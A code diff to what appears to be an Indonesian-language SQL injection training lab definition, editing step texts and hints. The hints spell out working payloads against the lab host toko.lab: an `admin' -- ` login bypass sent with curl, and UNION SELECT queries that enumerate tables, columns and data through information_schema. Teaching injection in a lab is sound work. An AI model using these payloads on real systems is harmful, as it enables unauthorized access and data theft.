@@ -42,7 +42,7 @@ export const sqliLab: LabDefinition = {
     { id: "error", text: "Masukkan satu tanda kutip `'` sebagai kata kunci. Aplikasi menampilkan **error SQL** — tanda bahwa input masuk mentah ke query", check: (ctx) => sqlTag(ctx, "web", "sql-error") },
     {
       id: "bypass",
-      text: "Login sebagai **admin** tanpa tahu password-nya dengan memanipulasi field `user` di form `/login`",
+      text: "Login sebagai **admin** tanpa tahu password-nya: kirim form `/login` dengan `curl -d \"user=...&pass=...\"` dan manipulasi field `user`",
       check: (ctx) => sqlTag(ctx, "web", "login-bypass:admin"),
     },
     { id: "schema", text: "Lewat pencarian, gunakan `UNION SELECT` untuk menampilkan daftar nama tabel dari `information_schema.tables`", check: (ctx) => sqlTag(ctx, "web", "schema-leaked") },
@@ -52,7 +52,7 @@ export const sqliLab: LabDefinition = {
   hints: [
     "Query pencarian di server kira-kira: `SELECT nama, harga FROM produk WHERE nama LIKE '%INPUT%'`. Satu kutip `'` menutup string terlalu cepat sehingga sintaksnya rusak.",
     "Login: `curl -d \"user=admin' -- &pass=bebas\" http://toko.lab/login`. Tanda `--` membuat sisa query (pengecekan password) menjadi komentar.",
-    "UNION butuh jumlah kolom yang sama (2 kolom). Contoh: `browser \"http://toko.lab/cari?q=x' UNION SELECT table_name, table_schema FROM information_schema.tables -- \"`. Setelah tahu nama tabelnya, ganti dengan `SELECT catatan, 1 FROM <nama_tabel>`.",
+    "UNION butuh jumlah kolom yang sama (2 kolom). Contoh: `browser \"http://toko.lab/cari?q=x' UNION SELECT table_name, table_schema FROM information_schema.tables -- \"`. Lalu cari nama kolomnya dengan `UNION SELECT column_name, table_name FROM information_schema.columns -- `, dan terakhir `UNION SELECT <kolom>, 1 FROM <tabel> -- `.",
   ],
 };
 
